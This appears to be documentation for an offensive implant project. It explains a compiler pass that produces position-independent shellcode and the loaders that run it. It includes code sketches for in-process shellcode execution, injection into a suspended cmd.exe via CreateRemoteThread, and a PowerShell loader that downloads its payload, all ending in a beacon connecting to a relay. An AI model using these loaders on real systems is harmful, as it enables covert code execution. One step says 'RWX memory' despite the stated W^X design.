# PIC Transform and Loaders: The Final Mile

Two topics here that bookend the project: the compiler pass that makes position-independent C++ possible, and the loaders that actually execute the resulting shellcode. One runs at build time, the other at runtime. Between them they close the loop from source code to execution.

---

## Part 1: The PIC Transform LLVM Pass

### What Is an LLVM Pass?

When Clang compiles C++ code, it doesn't go straight from source to machine code. It goes through stages:

```
C++ Source -> AST -> LLVM IR -> [optimization passes] -> Machine Code
```

LLVM IR (Intermediate Representation) is a low-level, platform-independent language that sits between your C++ and the actual instructions. Optimization passes transform this IR — dead code elimination, inlining, constant folding, loop unrolling, all that.

An LLVM pass is one of those transformations. `pic-transform` is a custom pass inserted into the pipeline. It walks the IR looking for anything that would create a data section and rewrites it as code-only operations.

The pass lives in `tools/pic-transform/`:
- `PICTransformPass.h` — declares the pass class (25 lines)
- `PICTransformPass.cpp` — the actual implementation (1177 lines, the most complex file in the project)
- `PICTransformOpt.cpp` — standalone CLI driver for running the pass outside the compiler

### What Gets Transformed

The pass handles five categories of data-section-producing constructs:

**1. String literals -> stack alloca + packed word stores**

```
// C++ source:
const char* msg = "Hello";

// Without pic-transform, the compiler generates:
//   @.str = private constant [6 x i8] c"Hello\00"
//   This constant lands in .rodata

// After pic-transform (conceptual x86_64 assembly):
sub rsp, 8
mov rax, 0x006F6C6C6548        ; "Hello\0" packed as little-endian integer
; rax goes through a register barrier (inline asm)
mov qword ptr [rsp], rax        ; store to stack
lea rdi, [rsp]                   ; pointer to the stack string
```

The string "Hello\0" is 6 bytes. On a 64-bit machine, that fits in one 8-byte register. The pass packs the bytes into an integer constant, passes it through a register barrier, and stores it on the stack. The string now lives in code (as an immediate value in a MOV instruction), not in `.rodata`.

**2. Constant arrays -> stack alloca + packed stores**

Same idea. An array like `int table[] = {1, 2, 3, 4}` becomes four immediate stores to the stack. Larger arrays get packed into word-sized chunks — on x86_64, that's 8 bytes per store.

**3. Floating-point constants -> integer bitcast**

```
// C++ source:
double pi = 3.14159265358979;

// Without transform: 3.14159... stored as 8 bytes in .rodata
// After transform:
mov rax, 0x400921FB54442D18     ; IEEE-754 bit pattern for pi
movq xmm0, rax                  ; transfer to FP register
```

The double's bit pattern is just a 64-bit integer. Load the integer into a GP register, then move it to an FP register. No data section needed.

The pass also handles x86-specific cases where instructions like `fneg` and `uitofp` generate implicit constant pool entries. These get lowered to explicit integer operations.

**4. Function pointers -> PC-relative inline assembly**

Taking the address of a function can create GOT (Global Offset Table) entries — data sections used by the dynamic linker. The pass rewrites function pointer loads as PC-relative inline assembly:

```
// Before: load function address from GOT
//   creates .got entry

// After (x86_64): PC-relative LEA
//   lea rax, [rip + function_symbol]
//   No GOT entry needed
```

Each architecture needs different inline assembly: `lea` on x86_64, `adr`/`adrp` on AArch64, etc.

**5. Diagnostics for remaining globals**

Anything the pass can't transform gets flagged with a compiler warning. This alerts the developer that manual intervention is needed — typically adding the `optnone` attribute or restructuring the code.

### Register Barriers: Preventing Re-Optimization

Here's the catch. The pic-transform pass runs early in the optimization pipeline. Later passes see those stack stores and recognize the pattern: "these are constant values being written to memory — I should hoist them into `.rodata` for efficiency." Which completely undoes the transform.

Register barriers stop this. From `PICTransformPass.cpp`:

```cpp
static Value *emitRegisterBarrier(IRBuilder<> &Builder, Value *Val) {
    Type *Ty = Val->getType();
    FunctionType *AsmTy = FunctionType::get(Ty, {Ty}, false);
    InlineAsm *Barrier = InlineAsm::get(
        AsmTy, "", "=r,0", /*hasSideEffects=*/true, /*isAlignStack=*/false);
    return Builder.CreateCall(Barrier, {Val});
}
```

This emits an inline assembly "call" that does nothing — empty asm string, just input/output constraints. But the optimizer sees inline assembly as a black box. It can't look through it, can't reason about the value on the other side. The constant 0x400921FB54442D18 goes in, "some unknown value" comes out. The optimizer leaves it alone.

Zero instructions generated. Pure optimizer-level deception.

### Plugin Mode vs Standalone Mode

The pass runs in two configurations:

**Plugin mode:** Loaded as a shared library directly into Clang via `-fpass-plugin=/path/to/pic-transform.so`. Runs automatically during compilation — one step, clean integration. This is the preferred mode.

**Standalone mode:** A separate binary (`PICTransformOpt`) that processes LLVM bitcode files. The compilation becomes a three-step pipeline: compile to bitcode (`.bc`), run the standalone transform, then compile bitcode to object (`.o`). Used when the plugin can't load — typically a mismatch between the LLVM version the pass was compiled against and the version of Clang being used.

The build system (`cmake/PICTransform.cmake`) auto-detects which mode is available and configures accordingly.

### Defense in Depth

The pic-transform pass is powerful, but it doesn't catch everything. The project uses five layers of defense:

1. **pic-transform** — handles string literals, float constants, arrays, function pointers
2. **Compiler flags** — `-fno-exceptions` eliminates `.eh_frame`, `-fno-rtti` eliminates type info tables, `-fno-asynchronous-unwind-tables` eliminates unwind data
3. **Linker scripts** — merge any surviving `.rodata` into `.text` as a last resort
4. **Code discipline** — `optnone` attribute on functions where the optimizer misbehaves, `NOINLINE` on functions that fill constant arrays on the stack
5. **VerifyPICMode** — post-build script scans the linker map and FAILS the build if any `.rodata`, `.data`, `.bss`, `.got`, or `.plt` section exists

No silver bullet. Just layers, each catching what the previous one missed.

### When PIC Breaks

If someone writes code that generates a data section and none of the five layers catch it before the binary is assembled, `VerifyPICMode.cmake` will catch it and fail the build. The developer then has to:

1. Check the linker map for which object file contributed the forbidden section
2. Disassemble the object to find the offending function
3. Fix the source: use `optnone`, move data to the stack, restructure the code

This feedback loop turns a subtle runtime bug (shellcode crashes when loaded at an unexpected address) into a loud build-time error. It's the equivalent of a regression test that runs on every build.

---

## Part 2: Loaders

### What Is a Loader?

The agent compiles to a `.bin` file — raw machine code bytes. No ELF header, no PE header, no section tables. Just instructions, starting at byte zero.

Those bytes can't execute on their own. They need to land in memory that's marked executable, and something needs to jump to the first byte. That "something" is the loader.

A loader is a small, normal program that:
1. Allocates memory with execute permission
2. Copies the shellcode bytes into that memory
3. Jumps to byte zero (which is `entry_point`)

The loader itself is NOT position-independent. It's a regular program that uses libc, makes normal function calls, and runs in a standard environment. Its only job is to get the shellcode running.

### W^X: Write XOR Execute

Modern operating systems enforce a policy: memory pages can be writable OR executable, but never both at the same time. This is called W^X (Write XOR Execute) or DEP (Data Execution Prevention).

If memory could be both writable and executable simultaneously, any buffer overflow could inject and immediately run arbitrary code. W^X prevents that.

All the loaders in this project comply with W^X. The pattern:
1. Allocate as **writable** (to copy shellcode in)
2. Flip to **executable** (to run it)
3. Memory is never both at the same time

### Python Loader: POSIX (In-Process)

On Linux and macOS, the Python loader runs shellcode in the same process:

```python
# 1. Allocate RW memory
buf = mmap.mmap(-1, len(shellcode), prot=PROT_READ | PROT_WRITE)

# 2. Copy shellcode
buf.write(shellcode)

# 3. Flip to RX (W^X transition)
ctypes.CDLL(None).mprotect(buf_addr, len(shellcode), PROT_READ | PROT_EXEC)

# 4. Cast to function pointer and call
func = ctypes.CFUNCTYPE(ctypes.c_int)(buf_addr)
func()
```

`mmap` allocates anonymous memory (not backed by a file). `mprotect` changes the page permissions. `ctypes.CFUNCTYPE` creates a callable function pointer from a raw address.

Tradeoffs: simple, but if the shellcode crashes, the Python process goes down too. The Python runtime stays resident in memory alongside the shellcode.

### Python Loader: Windows (Process Injection)

On Windows, the loader uses a different strategy — it injects the shellcode into a separate process:

```python
# 1. Create a suspended cmd.exe
process = subprocess.Popen("cmd.exe", creationflags=CREATE_SUSPENDED)

# 2. Allocate RW memory in the remote process
remote_addr = VirtualAllocEx(process.handle, size, MEM_COMMIT, PAGE_READWRITE)

# 3. Write shellcode to remote memory
WriteProcessMemory(process.handle, remote_addr, shellcode, size)

# 4. Flip to RX
VirtualProtectEx(process.handle, remote_addr, size, PAGE_EXECUTE_READ)

# 5. Create a thread in the remote process starting at the shellcode
CreateRemoteThread(process.handle, remote_addr)
```

The suspended `cmd.exe` never actually runs — it's a container for the shellcode. The shellcode ends up running under `cmd.exe`'s identity in the process list, not the Python loader's. The loader can exit after injection and the shellcode keeps going.

### PowerShell Loader

PowerShell can't call Win32 APIs natively, so it uses P/Invoke through inline C# (`Add-Type`):

```powershell
Add-Type -TypeDefinition @'
public static class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);
}
'@

# Allocate RW
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new($len), 0x3000, 0x04)

# Copy shellcode
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $len)

# Flip to RX
[Win32]::VirtualProtect($addr, [UIntPtr]::new($len), 0x20, [ref]$old)

# Execute via delegate
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $addr, [type][PayloadEntry])
$func.Invoke()
```

Same W^X pattern: allocate writable, copy, flip to executable, invoke. The `0x3000` is `MEM_COMMIT | MEM_RESERVE`, `0x04` is `PAGE_READWRITE`, `0x20` is `PAGE_EXECUTE_READ`.

Architecture is auto-detected from `$env:PROCESSOR_ARCHITECTURE` — the loader downloads the matching binary from GitHub Releases.

### In-Process vs Injected Execution

The two Python loader modes represent fundamentally different approaches:

| Aspect | In-Process (POSIX) | Injected (Windows) |
|--------|-------------------|-------------------|
| Where it runs | Same process as loader | Separate process (cmd.exe) |
| If shellcode crashes | Loader crashes too | Loader is unaffected |
| Persistence | Loader must stay running | Loader can exit |
| Process list | Shows as python3 | Shows as cmd.exe |
| Complexity | Simple (4 syscalls) | More involved (5 Win32 APIs) |

In real engagements, neither of these stock loaders would be used directly. They're reference implementations for testing and development. Production loaders would be custom-built for the specific environment, using techniques like process hollowing, DLL injection, or reflective loading.

---

## The Full Journey

From source to execution, this is what happens:

```
1. C++23 source code
     |
     v
2. Clang compiles with pic-transform pass
   (string literals -> stack immediates, floats -> bitcasts, etc.)
     |
     v
3. Linker merges all sections into .text
   (linker scripts, function ordering)
     |
     v
4. VerifyPICMode confirms single-section output
     |
     v
5. ExtractBinary strips headers, dumps raw .text
     |
     v
6. output.bin — raw machine code, entry_point at byte 0
     |
     v
7. Loader allocates RWX memory, copies bytes, jumps to byte 0
     |
     v
8. entry_point() runs, calls start(), beacon connects to relay
```

The pic-transform pass makes step 2 possible. The loaders make step 7 possible. Everything in between is the build system fighting to keep the output as a single `.text` section. The whole project exists in the narrow gap between "C++ compilers want data sections" and "shellcode can't have data sections."

---

## See Also

- `docs/03-build-system.md` — How the build pipeline integrates the pass
- `docs/01-what-is-pic.md` — Why position-independence matters
- `docs/04-entry-point.md` — What happens at byte 0 when the loader jumps
